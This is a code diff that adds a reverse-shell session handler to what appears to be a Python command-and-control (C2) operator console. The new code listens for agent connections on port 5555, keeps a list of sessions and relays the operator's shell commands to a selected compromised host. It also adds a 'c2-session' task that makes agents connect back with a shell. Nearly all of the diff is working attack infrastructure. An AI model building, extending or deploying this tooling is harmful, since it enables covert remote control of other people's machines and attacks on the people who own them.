@@ -2,6 +2,12 @@ import cmd
 import sqlite3
 import pyfiglet
 import os
+import socket
+import threading
+from time import sleep
+from threading import Lock
+from _thread import *
+import struct
 
 def recreate_tasks_table(conn, cursor):
     cursor.execute(f'''
@@ -60,6 +66,33 @@ def init_db(conn,cursor):
 def connect_db():
     return sqlite3.connect('c2.db', timeout=10)
 
+
+# https://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data
+
+def send_msg(sock, msg):
+    # Prefix each message with a 4-byte length (network byte order)
+    msg = struct.pack('>I', len(msg)) + msg
+    sock.sendall(msg)
+
+def recv_msg(sock):
+    # Read message length and unpack it into an integer
+    raw_msglen = recvall(sock, 4)
+    if not raw_msglen:
+        return None
+    msglen = struct.unpack('>I', raw_msglen)[0]
+    # Read the message data
+    return recvall(sock, msglen)
+
+def recvall(sock, n):
+    # Helper function to recv n bytes or return None if EOF is hit
+    data = bytearray()
+    while len(data) < n:
+        packet = sock.recv(n - len(data))
+        if not packet:
+            return None
+        data.extend(packet)
+    return data
+
 # possible actions for database lock issue
 # https://gist.github.com/rianhunter/10bfcff17c18d112de16
 # https://stackoverflow.com/questions/2740806/python-sqlite-database-is-locked
@@ -76,6 +109,151 @@ class CLI(cmd.Cmd):
         super().__init__()
         self.conn = conn
         self.cursor = cursor
+        self.host = ''
+        self.port = 5555
+        self.ServerSocket = None
+        self.connections = []
+        self.addresses = []
+        self._exit_sessions_lock = Lock()
+        self.exit_session = False
+        self.server_start_flag = False
+        self.current_shell_conn = None
+
+    def emptyline(self):
+        pass       
+    
+    def default(self,line):
+        if self.prompt == 'c2_cli> ':
+            print('Unknown command. Use ? to see the availiable commands')
+        else:
+            if "go back" in line:
+                self.prompt = 'c2_cli> '
+            else:
+                try:
+                    if self.current_shell_conn:
+
+                        send_msg(self.current_shell_conn,str.encode(f'c2-sessions cmd {line}'))                        
+                        self.current_shell_conn.settimeout(30.0)
+                        rsp = recv_msg(self.current_shell_conn)                        
+                        print(rsp.decode("UTF_8"))
+                    else:
+                        print("Not valid connection")
+                except Exception as ex:
+                    print(f"timeout... response took too long.")
+                    self.prompt = 'c2_cli> '
+                    return
+
+    def list_connections(self):        
+        try:
+            res = '-------------------------------- Sessions --------------------------------\n'
+            print(f'self.connections len : {len(self.connections)}')
+            for i, conn in enumerate(self.connections):
+                print(f'i : {i}')
+                try:
+                    send_msg(conn,str.encode(f'c2-sessions ping'))                    
+                    conn.settimeout(5.0)
+                    pong = recv_msg(conn)                   
+                    
+                    if not pong:
+                        del self.connections[i]
+                        del self.addresses[i]
+                        continue
+
+                except:
+                    # print(f'except i : {i}')
+                    # print(f'self.connections len : {len(self.connections)}')
+                    # print(f'self.addresses len : {len(self.addresses)}')
+
+                    del self.connections[i]
+                    del self.addresses[i]
+
+                    continue
+
+                res += f'[{i}] {self.addresses[i][0]} {self.addresses[i][1]} {self.addresses[i][2]}\n'            
+            print(f'{res}')
+            return
+        except Exception as ex:
+            print(f"Error on list_connections: {ex}")    
+            self.close_session_handler() 
+
+    def socket_create(self):
+        try:
+            self.ServerSocket = socket.socket()
+
+        except Exception as ex:
+            print(f"Error on socket_create: {ex} . Try again!")            
+            
+
+        self.ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        
+        return
+
+    def socket_bind(self):        
+        try:
+            self.ServerSocket.bind((self.host, self.port))
+            self.ServerSocket.listen(10)
+
+        except Exception as ex:
+            print(f"Error on socket_bind: {ex}")            
+            sleep(3)
+            self.socket_bind()
+        return
+
+
+    def socket_accept(self):        
+
+        for cn in self.connections:
+            cn.close()
+
+        self.connections = []
+        self.addresses = []
+
+        while True:
+            try:                
+                conn, address = self.ServerSocket.accept()
+                
+                conn.setblocking(True)
+                client_rsp = recv_msg(conn).decode("utf-8")                
+                address = address + (client_rsp,)
+
+                with self._exit_sessions_lock:                    
+                    if self.exit_session:
+                        print('Session Handler is shutting down...\n DO NO FORGET TO "task delete uuid" if you don\'t want to keep retrying...\n\nPress Enter...\n')
+                        self.close_sessions_and_quit()     
+                        break
+            except Exception as ex:
+                print(f"Error on accept_connections: {ex}")                  
+                continue
+
+            self.connections.append(conn)
+            self.addresses.append(address)
+            
+            print(f'\nConnection received from: {address[-1]} {address[0]} \nPress Enter...\n')
+            
+        return
+
+    def close_sessions_and_quit(self):        
+        for conn in self.connections:
+            try:
+                send_msg(conn,str.encode(f'c2-sessions quit'))
+                conn.shutdown(2)
+                conn.close()
+
+            except Exception as ex:
+                print(f"Error on close_sessions_and_quit: {ex}")                 
+        self.ServerSocket.close()
+
+    def close_session_handler(self):
+        with self._exit_sessions_lock:
+            self.exit_session = True   
+            try:         
+                # sends a message to itself to close the connections
+                s = socket.socket()
+                s.connect((self.host, self.port))
+                send_msg(s,str.encode(f'local_msg'))                
+                s.close()
+            except Exception as ex:
+                print(f"Error in local_msg: {ex}")
+        self.server_start_flag = False
 
     def print_rows(self, three_args = False, num = False, number = 0):
         for i, row in enumerate(self.cursor.fetchall()):
@@ -283,10 +461,56 @@ class CLI(cmd.Cmd):
             print('Deleted')
         else:
             self.do_help("find")
+
+    def do_sessions(self, args):
+        args = args.split()
+        if len(args) == 2 and args[0] == "server":
+            if args[1] == "start":
+
+                self.server_start_flag = True
+
+                with self._exit_sessions_lock:
+                    self.exit_session = False
+
+                self.socket_create()
+                self.socket_bind()
+                t = threading.Thread(target=self.socket_accept,)
+                t.start()
+                #start_new_thread(self.accept_connections())
+            elif args[1] == "stop":            
+                self.close_session_handler()
+        elif len(args) == 2 and args[0] == "select":
+            try:
+                host_idx = int(args[1])
+            except:
+                print('Use an integer from the sessions list')
+                return             
             
-    def do_exit(self, args):
-        print("Bye Bye Operator!")
-        return True
+            try:
+                host_conn = self.connections[host_idx]   
+                self.current_shell_conn = host_conn
+            except:
+                print('Connection not found. Use sessions list')
+                return       
+
+            print("Use 'go back' command to leave the session without closing it and return to Commander CLI\n")
+
+            self.prompt = f'{self.addresses[host_idx][2]}> '
+
+        elif len(args) == 1:
+            if args[0] == "list":
+                self.list_connections()            
+        else:
+            self.do_help("sessions")
+            
+    def do_exit(self, args):       
+        if self.prompt != 'c2_cli> ':
+            print("If you want to exit the admin console use 'go back' first and then 'exit'")
+        else:
+            if self.server_start_flag:
+                self.close_session_handler()
+            print("Bye Bye Operator!")
+            return True
     
     def complete_task(self, text, line, begidx, endidx):
         
@@ -294,7 +518,7 @@ class CLI(cmd.Cmd):
         options_add = ["your_uuid", "all", "type="]
         options_del = ["your_uuid", "all", "type="]
         options_c2 = ["c2-"]        
-        options_c2_cmds = ["register", "shell", "sleep", "quit"]
+        options_c2_cmds = ["register", "shell", "sleep", "quit", "session"]
         options_os = ["linux", "windows"]
 
         if "task add" in line:
@@ -339,6 +563,18 @@ class CLI(cmd.Cmd):
                 return [i for i in options_os if i.startswith(text)]
         else:
             return [i for i in options if i.startswith(text)]
+
+
+    def complete_sessions(self, text, line, begidx, endidx):
+        
+        options = ["server", "select", "list"]
+        options_server_args = ["start", "stop"]        
+
+        if "sessions server" in line:
+            return [i for i in options_server_args if i.startswith(text)]
+        
+        else:
+            return [i for i in options if i.startswith(text)]
             
         
     def complete_find(self, text, line, begidx, endidx):
@@ -357,8 +593,11 @@ class CLI(cmd.Cmd):
               "    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' \n"
               "    c2-commands: possible values are c2-register c2-shell c2-sleep c2-quit\n"
               "      c2-register: Triggers the agent to register again.\n"
-              "      c2-shell: It takes an shell command for the agent to execute. eg. c2-shell whoami\n"
+              "      c2-shell cmd: It takes an shell command for the agent to execute. eg. c2-shell whoami\n"
+              "         cmd: The command to execute.\n"
               "      c2-sleep: Configure the interval that an agent will check for tasks.\n"
+              "      c2-session port: Instructs the agent to open a shell session with the server.\n"
+              "         port: The port to connect to. If it is not provided it defaults to 5555.\n"
               "      c2-quit: Forces an agent to quit.\n\n"
               "  task delete arg\n"
               "    Delete a task from an agent or all agents.\n"
@@ -376,6 +615,18 @@ class CLI(cmd.Cmd):
               "    Drops the database so that the active agents will be registered again.\n\n"              
               "  exit\n"
               "    Bye Bye!\n\n"              
+              )
+        
+        if args in ["sessions",""]:
+            print("Sessions:\n\n"         
+              "  sessions server arg\n"
+              "    Controls a session handler.\n"              
+              "    arg: can have the following values: 'start' or 'stop' \n"
+              "  sessions select arg\n"
+              "    Select in which session to attach.\n"
+              "    arg: the index from the 'sessions list' result \n"
+              "  sessions list\n"
+              "    Displays the availiable sessions\n"              
               )
 
 if __name__ == '__main__':
